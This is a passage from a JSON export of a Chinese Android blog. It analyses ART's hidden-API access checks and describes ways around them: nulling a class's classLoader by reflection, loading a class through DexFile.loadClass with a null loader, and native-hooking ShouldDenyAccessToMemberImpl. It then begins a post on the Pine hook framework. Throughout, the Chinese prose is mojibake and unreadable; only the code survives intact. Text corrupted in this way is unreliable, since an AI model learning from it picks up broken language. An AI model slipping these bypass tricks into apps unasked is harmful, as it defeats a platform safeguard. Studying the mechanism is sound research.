(m-&gt;IsRuntimeMethod()) &#123; // è·³è¿‡ ART Runtime å†…éƒ¨æ–¹æ³• return true; &#125; ObjPtr&lt;mirror::Class&gt; declaring_class = m-&gt;GetDeclaringClass(); if (declaring_class-&gt;IsBootStrapClassLoaded()) &#123; // è·³è¿‡ java.lang.Class ä¸­çš„å†…éƒ¨æ–¹æ³• if (declaring_class-&gt;IsClassClass()) &#123; return true; &#125; // è·³è¿‡ java.lang.invoke.* ObjPtr&lt;mirror::Class&gt; lookup_class = GetClassRoot&lt;mirror::MethodHandlesLookup&gt;(); if ((declaring_class == lookup_class || declaring_class-&gt;IsInSamePackage(lookup_class)) &amp;&amp; !m-&gt;IsClassInitializer()) &#123; return true; &#125; // å¦‚æœPREVENT_META_REFLECTION_BLACKLIST_ACCESSä¸ºEnabledï¼Œè·³è¿‡æ¥è‡ª java.lang.reflect.* çš„è®¿é—® // ç³»ç»Ÿå¯¹â€œå¥—å¨ƒåå°„â€çš„é™åˆ¶çš„å…³é”®å°±åœ¨æ­¤ ObjPtr&lt;mirror::Class&gt; proxy_class = GetClassRoot&lt;mirror::Proxy&gt;(); if (declaring_class-&gt;IsInSamePackage(proxy_class) &amp;&amp; declaring_class != proxy_class) &#123; if (Runtime::Current()-&gt;isChangeEnabled(kPreventMetaReflectionBlacklistAccess)) &#123; return true; &#125; &#125; &#125; caller = m; return false;&#125;æ ¹æ®calleré€‰æ‹©Domainï¼š123456789101112131415161718192021static Domain ComputeDomain(ObjPtr&lt;mirror::ClassLoader&gt; class_loader, const DexFile* dex_file) &#123; if (dex_file == nullptr) &#123; // dex_file == nullptr &amp;&amp; class_loader == nullptrï¼ˆå³è¢«BootClassLoaderåŠ è½½çš„ç±»ï¼‰ï¼Œé‚£ä¹ˆå¯ä¿¡ return ComputeDomain(/* is_trusted= */ class_loader.IsNull()); &#125; // è·å–dex_fileçš„Domain return dex_file-&gt;GetHiddenapiDomain();&#125;static Domain ComputeDomain(ObjPtr&lt;mirror::Class&gt; klass, const DexFile* dex_file) REQUIRES_SHARED(Locks::mutator_lock_) &#123; Domain domain = ComputeDomain(klass-&gt;GetClassLoader(), dex_file); if (domain == Domain::kApplication &amp;&amp; klass-&gt;ShouldSkipHiddenApiChecks() &amp;&amp; Runtime::Current()-&gt;IsJavaDebuggable()) &#123; // debug modeä¸‹å¼€å‘è€…å¯ä»¥ä¸»åŠ¨æŒ‡å®šæŸç±»å¯ä¿¡ï¼Œç”¨äºè°ƒè¯• domain = ComputeDomain(/* is_trusted= */ true); &#125; return domain;&#125;dex_fileçš„Domainåœ¨ç¬¬ä¸€æ¬¡åŠ è½½Classæ—¶è¢«åˆå§‹åŒ–ï¼ˆæ³¨ï¼šAndroid 8æ—¶å°±å·²ç»ä¸å…è®¸ä¸€ä¸ªDexFileåŒæ—¶åŠ è½½å¤šä¸ªClassLoaderäº†ï¼‰ï¼š1234567891011121314151617181920212223242526272829303132333435static Domain DetermineDomainFromLocation(const std::string&amp; dex_location, ObjPtr&lt;mirror::ClassLoader&gt; class_loader) &#123; if (ArtModuleRootDistinctFromAndroidRoot()) &#123; // åœ¨å‡ ä¸ªæ ¸å¿ƒapex moduleå†… if (LocationIsOnArtModule(dex_location.c_str()) || LocationIsOnConscryptModule(dex_location.c_str()) || LocationIsOnI18nModule(dex_location.c_str())) &#123; return Domain::kCorePlatform; &#125; // åœ¨apexä¸‹ä½†æ˜¯ä¸æ˜¯æ ¸å¿ƒmodule if (LocationIsOnApex(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; &#125; // åœ¨/system/framework/ä¸‹ if (LocationIsOnSystemFramework(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; // åœ¨/system/ext/framework/ä¸‹ if (LocationIsOnSystemExtFramework(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; // ClassLoaderæ˜¯nullï¼ˆå³BootClassLoaderï¼‰ if (class_loader.IsNull()) &#123; LOG(WARNING) &lt;&lt; \"DexFile \" &lt;&lt; dex_location &lt;&lt; \" is in boot class path but is not in a known location\"; return Domain::kPlatform; &#125; return Domain::kApplication;&#125;å€¼å¾—æ³¨æ„çš„æ˜¯Android Qä¸­ç»†åˆ†å‡ºäº†ä¸‰ä¸ªDomainï¼škCorePlatformã€kPlatformã€kApplicationï¼ŒåŒæ—¶å¯¹kPlatformè®¿é—®kCorePlatformçš„æƒ…å†µä¹Ÿåšå‡ºäº†ä¸€å®šé™åˆ¶ï¼š1234567891011121314151617case Domain::kPlatform: &#123; DCHECK(callee_context.GetDomain() == Domain::kCorePlatform); // å¦‚æœæ˜¯éœ€è¦æš´éœ²å‡ºæ¥çš„Core Platform APIï¼Œé€šè¿‡ if ((runtime_flags &amp; kAccCorePlatformApi) != 0) &#123; return false; &#125; // å®Œå…¨å…³é—­è®¿é—®é™åˆ¶ï¼Œé€šè¿‡ // Android Qä¸­é»˜è®¤æ˜¯å…³é—­ï¼ŒRä¸­ä¸çŸ¥é“ EnforcementPolicy policy = Runtime::Current()-&gt;GetCorePlatformApiEnforcementPolicy(); if (policy == EnforcementPolicy::kDisabled) &#123; return false; &#125; return detail::HandleCorePlatformApiViolation(member, caller_context, access_method, policy);&#125;Qä¸­é»˜è®¤æ˜¯å…³é—­è¿™ä¸ªåŠŸèƒ½ï¼ŒRä¸­ä¸çŸ¥é“ï¼›è¿™éƒ¨åˆ†ç®€å•äº†è§£ä¸€ä¸‹å°±å¥½ï¼Œä¸»è¦è¿˜æ˜¯å…³æ³¨kApplicationå³åº”ç”¨ä»£ç è®¿é—®ç³»ç»ŸAPIçš„æƒ…å†µã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950template&lt;typename T&gt;bool ShouldDenyAccessToMemberImpl(T* member, ApiList api_list, AccessMethod access_method) &#123; Runtime* runtime = Runtime::Current(); EnforcementPolicy hiddenApiPolicy = runtime-&gt;GetHiddenApiEnforcementPolicy(); MemberSignature member_signature(member); // ARTå†…éƒ¨å­˜åœ¨ä¸€ä¸ªè±å…åå•ï¼Œå¦‚æœåŒ¹é…ï¼Œé‚£ä¹ˆé€šè¿‡ if (member_signature.DoesPrefixMatchAny(runtime-&gt;GetHiddenApiExemptions())) &#123; MaybeUpdateAccessFlags(runtime, member, kAccPublicApi); return false; &#125; bool deny_access = false; EnforcementPolicy testApiPolicy = runtime-&gt;GetTestApiEnforcementPolicy(); // å¦‚æœhiddenApiPolicy == EnforcementPolicy::kJustWarnï¼Œé‚£ä¹ˆä¸ä½œå¤„ç†ï¼ˆEnforcementPolicyåªæœ‰ä¸‰ç§çŠ¶æ€ï¼‰ if (hiddenApiPolicy == EnforcementPolicy::kEnabled) &#123; if (testApiPolicy == EnforcementPolicy::kDisabled &amp;&amp; api_list.IsTestApi()) &#123; // ARTå†…éƒ¨å¯¹æµ‹è¯•APIï¼ˆå³æœ‰@TestApiæ³¨è§£çš„APIï¼‰çš„ç‰¹åˆ«å¤„ç† deny_access = false; &#125; else &#123; // æ¯”è¾ƒSdkVersionï¼Œå†³å®šæ˜¯å¦éœ€è¦æ‹’ç»è®¿é—® // æ‰€è°“çš„ ç°åå•/é»‘åå• ä¾¿åœ¨æ­¤å®ç° switch (api_list.GetMaxAllowedSdkVersion()) &#123; case SdkVersion::kP: deny_access = runtime-&gt;isChangeEnabled(kHideMaxtargetsdkPHiddenApis); break; case SdkVersion::kQ: deny_access = runtime-&gt;isChangeEnabled(kHideMaxtargetsdkQHiddenApis); break; default: deny_access = IsSdkVersionSetAndMoreThan(runtime-&gt;GetTargetSdkVersion(), api_list.GetMaxAllowedSdkVersion()); &#125; &#125; &#125; if (access_method != AccessMethod::kNone) &#123; // çœç•¥ä»£ç ï¼šå‘å‡ºå…³äºè®¿é—®éšè—APIçš„è­¦å‘Š // If this access was not denied, move the member into whitelist and skip // the warning the next time the member is accessed. if (!deny_access) &#123; MaybeUpdateAccessFlags(runtime, member, kAccPublicApi); &#125; &#125; return deny_access;&#125;OKï¼Œå¤§è‡´æµç¨‹éƒ½å·²ç»æ¸…æ™°ï¼Œæ¢³ç†ä¸€ä¸‹ï¼šå¦‚æœç›®æ ‡æˆå‘˜æ˜¯å…¬å¼€APIï¼Œç›´æ¥é€šè¿‡è·å–è°ƒç”¨è€…çš„AccessContextï¼Œå¦‚æœå¯ä¿¡é‚£ä¹ˆé€šè¿‡å¦‚æœè®¿é—®æ£€æŸ¥è¢«å®Œå…¨å…³é—­ï¼Œé‚£ä¹ˆé€šè¿‡åˆ¤æ–­ç›®æ ‡æˆå‘˜æ˜¯å¦åœ¨è±å…åå•é‡Œï¼Œå¦‚æœåœ¨é‚£ä¹ˆé€šè¿‡hiddenApiPolicy == EnforcementPolicy::kJustWarnï¼Œä¸ä¼šå¯¹deny_accessèµ‹å€¼ï¼Œè­¦å‘Šåé€šè¿‡ä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œæ ¹æ®targetSdkVersionå†³å®šæ˜¯å¦éœ€è¦æ‹’ç»è®¿é—®ä¸‹æœ‰å¯¹ç­–æŠŠç³»ç»Ÿçš„ç­–ç•¥ææ¸…æ¥šäº†ï¼Œæ¥ä¸‹æ¥ç»•è¿‡å°±å®¹æ˜“äº†ã€‚æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥ï¼šé¦–å…ˆå¦‚æœè¿™ä¸ªmemberçš„access flagsé‡Œæœ‰kAccPublicApiï¼Œé‚£ä¹ˆç³»ç»Ÿå°±è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå…¬å¼€APIï¼Œå°±ä¸ä¼šè¿›è¡Œä»»ä½•é™åˆ¶äº†ï¼Œç„¶è€Œæˆ‘ä»¬å¦‚æœè¦å¯¹access_flagsåŠ¨æ‰‹è„šï¼Œå¿…é¡»å…ˆæ‹¿åˆ°è¿™ä¸ªmemberï¼Œç„¶è€Œç³»ç»Ÿå°±æ˜¯é™åˆ¶äº†æˆ‘ä»¬å»æ‹¿è¿™ä¸ªmemberçš„è¿‡ç¨‹ï¼Œæ­»å¾ªç¯äº†ï¼Œæ”¾å¼ƒï¼›ç„¶åï¼Œå¦‚æœè°ƒç”¨è€…æ˜¯å¯ä¿¡çš„ï¼Œé‚£ä¹ˆä¹Ÿä¼šé€šè¿‡ï¼Œæœ‰è¿™äº›æƒ…å†µï¼šè°ƒç”¨è€…æ‰€åœ¨çš„ç±»åœ¨ç³»ç»Ÿè·¯å¾„ä¸‹è°ƒç”¨è€…æ‰€åœ¨çš„ç±»å¯¹åº”çš„ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰ä¸ºnullï¼ˆå³è¢«BootClassLoaderåŠ è½½çš„ç±»ï¼‰debugç‰ˆå¹¶ä¸”ä¸»åŠ¨è®¾ç½®äº†è·³è¿‡é™åˆ¶ï¼Œå¯¹åº”æ¥å£ä¸ºVMDebug.allowHiddenApiReflectionFrom(Class&lt;?&gt; klass)æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥æŠŠè‡ªå·±çš„ç±»å˜æˆç³»ç»Ÿç±»ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡ç³»ç»ŸAPIå‘èµ·è°ƒç”¨ï¼›ç¬¬äºŒç§å¯¹åº”çš„å®ç°æ–¹æ¡ˆå°±æ˜¯å¥—å¨ƒåå°„ï¼Œç„¶è€Œç°åœ¨å·²ç»è¢«è°·æ­Œå°æ‰äº†ï¼Œæˆ‘ä¹Ÿæ‰¾ä¸åˆ°å…¶ä»–APIï¼Œå°±åªå‰©ä¸‹æŠŠè‡ªå·±çš„ç±»å˜æˆç³»ç»Ÿç±»äº†ã€‚é¦–å…ˆæ’é™¤åªèƒ½åœ¨debug modeå·¥ä½œçš„3ï¼›è€Œ1ä¹Ÿæ²¡æ³•æ»¡è¶³ï¼Œä¸»åŠ¨ä¿®æ”¹dex_file-&gt;hiddenapi_domain_éœ€è¦å…ˆæ‹¿åˆ°è¿™ä¸ªdex_fileæŒ‡é’ˆï¼Œè€Œä¸ä½¿ç”¨ARTå†…éƒ¨æ¥å£çš„æƒ…å†µä¸‹æ˜¯ä¸æ–¹ä¾¿æ‹¿åˆ°çš„ï¼Œè€Œä¸”ä¿®æ”¹hiddenapi_domain_éœ€è¦æå‰çŸ¥é“è¿™ä¸ªæˆå‘˜å˜é‡å¯¹åº”çš„åç§»ï¼Œå…ˆæ”¾å¼ƒï¼›2æˆ‘è§‰å¾—æ˜¯è¿™ä¸‰ç§æ–¹æ³•é‡Œæœ€å¥½çš„ï¼ŒClasså¯¹è±¡ç›´æ¥åœ¨javaå±‚å°±èƒ½æ‹¿åˆ°ï¼Œæ”¹ä¹Ÿå¯ä»¥ç›´æ¥åœ¨javaå±‚æ”¹ï¼Œç±»ä¼¼è¿™æ ·ï¼š123Field classLoaderField = Class.class.getDeclaredField(\"classLoader\");classLoaderField.setAccessible(true);classLoaderField.set(MyClass.class, null);ç„¶åå°±å¯ä»¥ç”¨è¿™ä¸ªMyClassè¿›è¡Œåå°„ã€‚é—®é¢˜åœ¨äºè¿™ä¸ªclassLoaderå˜é‡ä¹Ÿæ˜¯éšè—APIï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨Unsafeç­‰æ–¹æ¡ˆï¼Œä½†ç»ˆç©¶ä¸ä¿é™©ï¼›æˆ‘ä»¬æœ€å¥½ä½¿ç”¨å…¬å¼€APIï¼Œé‚£æœ‰è¿™æ ·çš„å…¬å¼€APIå—ï¼Ÿæœ‰ï¼dalvik.system.DexFileä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼š1public Class loadClass (String name, ClassLoader loader)ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æŒ‡å®šè¯¥Classçš„ClassLoaderï¼Œè®¾ç½®æˆnullå³å¯ã€‚ä½†ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½ éœ€è¦è‡ªå·±é¢å¤–å‡†å¤‡ä¸€ä¸ªdexæ–‡ä»¶ï¼ŒåŠ è½½è·å¾—DexFileå¯¹è±¡åå†è°ƒç”¨loadClassï¼Œç•¥æ˜¾ç¹çï¼Œå®é™…ä½¿ç”¨çš„è¯å¯ä»¥å¼„ä¸ªgradleè„šæœ¬ï¼Œæ‹¦æˆªmergeDexDebug/Releaseæ‹¿åˆ°dexï¼›å¦ä¸€ä¸ªé—®é¢˜æ˜¯DexFileæ˜¯Deprecatedï¼Œè™½ç„¶ç°åœ¨ç”¨æ²¡é—®é¢˜ï¼Œä½†ä¿ä¸å‡†å“ªå¤©å°±è¢«è°·æ­Œç»™åˆ äº†ã€‚æåˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæœ‰çš„å°ä¼™ä¼´å¯èƒ½ä¼šæƒ³èµ·æ¥ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å¾—ä¸€ä¸ªè¡Œä¸ºå—æˆ‘ä»¬æ§åˆ¶ä¸”class_loader==nullçš„ç±»ï¼Œjava.lang.reflect.Proxyä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„æ¥å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨åŠ¨æ€ä»£ç†å—ï¼Ÿäº‹å®è¯æ˜æ˜¯ä¸è¡Œçš„ï¼Œä½ ç¡®å®å¯ä»¥è·å¾—ä¸€ä¸ªclass_loader==nullçš„ä»£ç†ç±»ï¼Œç„¶è€ŒåŠ¨æ€ä»£ç†åªæ˜¯ä¸€ä¸ªæ¡¥æ¢ï¼Œæœ€åæ‰§è¡ŒåŠ¨ä½œæ˜¯ç”¨çš„InvocationHandlerå¯¹è±¡ï¼Œæœ€ç»ˆæ ˆå›æº¯çš„ç»“æœå–å†³äºè¿™ä¸ªInvocationHandlerå¯¹åº”çš„Classã€‚ï¼ˆæ³¨ï¼šè¿™å°±æ˜¯æˆ‘å½“æ—¶æå‡ºçš„å¦ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå½“æ—¶åœ¨æˆ‘è‡ªå·±çš„è´´å§é‡Œå‘äº†ä¸ªè´´ï¼Œä¹‹åè¢«ç™¾åº¦åˆ äº†ï¼Œç”³è¯‰å››æ¬¡æ²¡è¿‡ï¼Œå‘µå‘µï¼‰ä¼¼ä¹ä»è¿™é‡Œå…¥æ‰‹ä¸å¤ªå¥½çš„æ ·å­ï¼Œæˆ‘ä»¬ç»§ç»­ã€‚ç¬¬ä¸‰æ­¥å’Œç¬¬äº”æ­¥ä¸­ï¼Œéƒ½éœ€è¦é€šè¿‡runtime-&gt;GetHiddenApiEnforcementPolicy()çš„è¿”å›å€¼åšåˆ¤æ–­ï¼ŒæŸ¥çœ‹å®ç°å¯ä»¥çœ‹è§å…¶å®å°±æ˜¯è¿”å›äº†ä¸€ä¸ªæˆå‘˜å˜é‡hidden_api_policy_ï¼Œé‚£æˆ‘ä»¬æ”¹è¿™ä¸ªæˆå‘˜å˜é‡ä¸å°±è¡Œäº†ï¼Ÿç„¶è€Œæ‰“å¼€runtime.hä½ å°±ä¼šå‘ç°è¿™ä¸ªå¯¹è±¡å¤ªå¤§äº†ï¼Œä»€ä¹ˆä¸œè¥¿éƒ½å¾€é‡Œé¢æ‰”ï¼Œæ”¹é‡Œé¢çš„å€¼å­˜åœ¨ä¸€å®šé£é™©ï¼›æœç´¢ä¸€ä¸‹ä½ ä¼šå‘ç°arté€šè¿‡RAIIæœºåˆ¶å°è£…äº†ä¸€ä¸ªScopedHiddenApiEnforcementPolicySettingå‡ºæ¥ï¼Œç„¶è€Œè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°å¹¶æ²¡æœ‰å¯¼å‡ºï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è°ƒç”¨ï¼Œå…ˆæ”¾ç€ã€‚ç¬¬å››æ­¥ä¸­æåˆ°artå†…éƒ¨æœ‰ä¸€ä¸ªè±å…åå•ï¼Œè€Œè¿™ä¸ªåå•åŒæ ·ä¿å­˜åœ¨runtimeä¸­ï¼Œå’Œä¸Šé¢çš„æƒ…å†µä¸€æ ·ï¼›ä¸è¿‡è¿™ä¸ªAPIæš´éœ²åˆ°äº†javaå±‚ï¼Œjavaå±‚ä¸­æœ‰å¯¹åº”çš„æ¥å£ï¼ˆVMRuntime.setHiddenApiExemptions(String[] exemptions)ï¼‰ï¼Œä¸è¿‡è¿™ä¸ªæ¥å£åœ¨é»‘åå•å†…ï¼Œä¹Ÿæ— æ³•ç›´æ¥è°ƒç”¨ã€‚OKï¼Œç ”ç©¶å®Œäº†ï¼Œå¾—å‡ºç»“è®ºï¼šæ²¡æœ‰è¾ƒä¸ºæ–¹ä¾¿é€šç”¨ç¨³å®šçš„æ–¹æ³•â€¦â€¦æ‰æ€ªã€‚æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆåŠŸæ‹¿åˆ°memberï¼Œåæ˜ åˆ°ä»£ç é‡Œå°±æ˜¯ShouldDenyAccessToMemberè¿”å›falseï¼Œä¸ºæ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å„ç§æ–¹å¼å¹²æ‰°è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œï¼Œä½†æœ€ç»ˆéƒ½è¿˜æ˜¯ä¸ºäº†è®©å®ƒè¿”å›falseã€‚æ—¢ç„¶æˆ‘ä»¬åªæ˜¯ä¸ºäº†è¿™ä¸ªï¼Œé‚£ä¹ˆå…¶å®å¯ä»¥ç”¨æ›´ç›´è§‚çš„æ–¹å¼ï¼šnative hookã€‚æŸ¥çœ‹artä»£ç å¯ä»¥å‘ç°æ— è®ºæ˜¯Pä¸Šçš„ShouldBlockAccessToMemberè¿˜æ˜¯Qä¸Šçš„ShouldDenyAccessToMemberï¼Œæ‰§è¡Œæµç¨‹ä¸­éƒ½ä¼šè°ƒç”¨æŸä¸ªå…³é”®çš„ä¸”ç¬¦å·å·²è¢«å¯¼å‡ºçš„å‡½æ•°ï¼ŒPä¸Šæ˜¯GetMemberActionImplï¼ŒQä¸Šæ˜¯ShouldDenyAccessToMemberImplï¼Œç›´æ¥hookä½ï¼Œä¿®æ”¹å®ƒçš„è¿”å›å€¼å°±okäº†ï¼Œç›®å‰Pineé‡‡ç”¨äº†è¿™ç§æ–¹å¼ï¼Œå…·ä½“å®ç°å¯è§è¿™ä¸ªcommitã€‚æ€»ç»“å—¯ï¼Œå¤§æ¦‚å°±æ˜¯è¿™æ ·å•¦~åˆæ”¾ä¸€ä¸‹å’±çš„QQç¾¤ï¼š949888394~æ„Ÿè°¢ä½ èƒ½çœ‹åˆ°æœ€å~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"hidden-api","slug":"hidden-api","permalink":"https://blog.canyie.top/tags/hidden-api/"}]},{"title":"ARTä¸Šçš„åŠ¨æ€Javaæ–¹æ³•hookæ¡†æ¶","slug":"dynamic-hooking-framework-on-art","date":"2020-04-27T02:00:00.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2020/04/27/dynamic-hooking-framework-on-art/","link":"","permalink":"https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/","excerpt":"å¤§å®¶åº”è¯¥è¿˜è®°å¾—æˆ‘ä¸Šæ¬¡ä»‹ç»çš„Dreamlandå§ï¼Œå¿˜è®°äº†ä¹Ÿæ²¡äº‹ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼šè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼Xposedçš„æ¡†æ¶ï¼Œå¯ä»¥æ³¨å…¥åº”ç”¨è¿›ç¨‹å¹¶è¿›è¡Œæ–¹æ³•hookã€‚è¿›ç¨‹æ³¨å…¥ä¸Šæ¬¡å·²ç»è¯´è¿‡äº†ï¼Œå¦ä¸€ä¸ªé‡ç‚¹hookå½“æ—¶æ˜¯ä½¿ç”¨äº†SandHookæ¡†æ¶ï¼Œè¿™æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„hookæ¡†æ¶ï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä¸å¤ªé€‚åˆDreamlandï¼›åœ¨æ¯”è¾ƒäº†å…¶ä»–hookæ¡†æ¶ä¹‹åï¼Œå‘ç°ä¼¼ä¹éƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæœ€ç»ˆå†³å®šè‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªã€‚å·²ç»å¼€æºï¼Œä»£ç åœ¨è¿™ï¼šPineï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šä»‹ç»å®ƒçš„å…·ä½“å®ç°ã€‚","text":"å¤§å®¶åº”è¯¥è¿˜è®°å¾—æˆ‘ä¸Šæ¬¡ä»‹ç»çš„Dreamlandå§ï¼Œå¿˜è®°äº†ä¹Ÿæ²¡äº‹ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼šè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼Xposedçš„æ¡†æ¶ï¼Œå¯ä»¥æ³¨å…¥åº”ç”¨è¿›ç¨‹å¹¶è¿›è¡Œæ–¹æ³•hookã€‚è¿›ç¨‹æ³¨å…¥ä¸Šæ¬¡å·²ç»è¯´è¿‡äº†ï¼Œå¦ä¸€ä¸ªé‡ç‚¹hookå½“æ—¶æ˜¯ä½¿ç”¨äº†SandHookæ¡†æ¶ï¼Œè¿™æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„hookæ¡†æ¶ï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä¸å¤ªé€‚åˆDreamlandï¼›åœ¨æ¯”è¾ƒäº†å…¶ä»–hookæ¡†æ¶ä¹‹åï¼Œå‘ç°ä¼¼ä¹éƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæœ€ç»ˆå†³å®šè‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªã€‚å·²ç»å¼€æºï¼Œä»£ç åœ¨è¿™ï¼šPineï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šä»‹ç»å®ƒçš„å…·ä½“å®ç°ã€‚å…¶ä»–æ¡†æ¶çš„ä¸€äº›é—®é¢˜æ³¨ï¼šè¿™é‡Œå¹¶æ²¡æœ‰è´¬ä½å…¶ä»–æ¡†æ¶çš„æ„æ€ï¼Œåªæ˜¯å•çº¯çš„æ¯”è¾ƒç°åœ¨æ˜¯2020å¹´ï¼ŒART Hookæ¡†æ¶å·²ç»éå¸¸å¤šï¼Œä½†æ˜¯è‚¯å®šä¸æ˜¯éšä¾¿æ‹¿ä¸€ä¸ªå°±èƒ½ç”¨çš„ï¼›æˆ‘ä»¬éœ€è¦ä¸€ä¸ªèƒ½æä¾›Xposed-style hookæ¥å£çš„æ¡†æ¶ï¼ŒXposedçš„hookæ¥å£åªè¦æ±‚æä¾›ä¸€ä¸ªcallbackï¼Œæ˜¯å®Œå…¨åŠ¨æ€çš„ï¼Œè€ŒåƒYAHFAè¿™æ ·çš„æ¡†æ¶åˆ™è¦æ±‚æä¾›ä¸€ä¸ªä¸ç›®æ ‡æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼éƒ½ç›¸åŒçš„æ–¹æ³•ï¼Œå¦‚æœéœ€è¦è°ƒç”¨åŸæ–¹æ³•è¿˜éœ€è¦æä¾›ä¸€ä¸ªbackupæ–¹æ³•ï¼Œæ— æ³•ç›´æ¥åšåˆ°åƒXposedé‚£æ ·çš„é£æ ¼çš„hookã€‚è¿™æ ·ä¸€è¿‡æ»¤ï¼Œå‰©ä¸‹çš„æ¡†æ¶å°±ä¸å¤šäº†ï¼ŒæŒ‘å‡ºäº†å‡ ä¸ªæ¡†æ¶ï¼šWhaleï¼ŒåŸç†æ˜¯è®¾ç½®ç›®æ ‡æ–¹æ³•ä¸ºnativeï¼Œç„¶åç”¨libffiåŠ¨æ€ç”Ÿæˆä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œè®¾ç½®entry_point_from_jniä¸ºè¿™ä¸ªå¤„ç†å‡½æ•°ã€‚è¿™ä¸ªæ¡†æ¶å¯ä»¥ç›´æ¥åƒXposedé‚£æ ·hookï¼Œä¸è¿‡å®æµ‹ä¸å¤ªç¨³å®šï¼Œæ¯”å¦‚åœ¨bridgeé‡Œéšä¾¿æŠ›ä¸ªå¼‚å¸¸ï¼ˆå³ä½¿è¢«try-catchä½ï¼‰å°±ä¼šå¯¼è‡´Runtimeç›´æ¥abortã€‚Frida/AndHookä¼¼ä¹ä¹Ÿæ˜¯ä¸€æ ·çš„å¥—è·¯ï¼Œåº”è¯¥ä¹Ÿä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚SandHookï¼Œè¿™ä¸ªæ¡†æ¶å¯¹Xposedå…¼å®¹è‡ªå¸¦æœ‰ä¸¤ç§æ–¹æ¡ˆï¼šä¸€æ˜¯ç”¨DexMakeråŠ¨æ€ç”Ÿæˆbridgeå‡½æ•°ï¼Œæ²¡æœ‰ä»€ä¹ˆå…¼å®¹æ€§é—®é¢˜ï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡åŠ è½½çš„æ—¶å€™ä¼šå¾ˆæ…¢ï¼›äºŒæ˜¯ç”¨åŠ¨æ€ä»£ç†ç”Ÿæˆbridgeæ–¹æ³•ï¼Œè¿™ä¸ªbridgeæ–¹æ³•ç”¨åƒwhaleä¸€æ ·çš„æ–¹æ¡ˆï¼šè®¾ç½®nativeï¼ŒlibffiåŠ¨æ€ç”Ÿæˆnativeå¤„ç†å‡½æ•°ï¼Œè®¾ç½®entry_point_from_jniã€‚è¿™ä¸ªæ–¹æ¡ˆç”¨èµ·æ¥å¾ˆå¿«ï¼Œä½†æ˜¯å­˜åœ¨æŒºå¤šå‘ï¼Œç¨³å®šæ€§å­˜ç–‘ã€‚FastHookï¼Œæ ¹æ®è°ƒç”¨çº¦å®šåœ¨æ ˆé‡Œæå‚æ•°ï¼Œä½œè€…å®£ç§°å®ƒâ€œé«˜æ•ˆç¨³å®šã€ç®€æ´æ˜“ç”¨â€ï¼Œç„¶è€Œè¯•äº†ä¸‹ï¼Œå¹¶ä¸ç¨³å®šï¼Œè€Œä¸”æä¾›çš„hookæ¥å£å¾ˆéš¾ç”¨ï¼ˆä¸€ä¸ªé€šç”¨æ¥å£æœ‰7ä¸ªå‚æ•°ï¼‰ï¼Œè€Œä¸”ä½œè€…ç°åœ¨ä¼¼ä¹ä¸ç»´æŠ¤äº†ï¼ŒemmmEpicï¼Œæ ¹æ®è°ƒç”¨çº¦å®šä»å¯„å­˜å™¨å’Œæ ˆé‡Œè§£æå‚æ•°ï¼ŒVirtualXposedå’Œå¤ªæéƒ½åœ¨ç”¨ï¼Œç»è¿‡å¤§é‡éªŒè¯éå¸¸ç¨³å®šï¼Œä¸è¿‡ç°åœ¨é—­æºäº†ï¼Œå¼€æºç‰ˆæœ‰ä¸€äº›bugç»è¿‡å¯¹æ¯”ï¼Œå‘ç°å¤§å¤šæ•°hookæ¡†æ¶éƒ½ä¸å¤ªç¬¦åˆè¦æ±‚ï¼ŒEpicç°åœ¨é—­æºï¼Œæœ€ç»ˆå†³å®šè‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªã€‚æ³¨ï¼šè¿™é‡Œåªæ˜¯æ ¹æ®æˆ‘çš„éœ€æ±‚è¯„ä¼°çš„ï¼Œå¦‚æœä½ 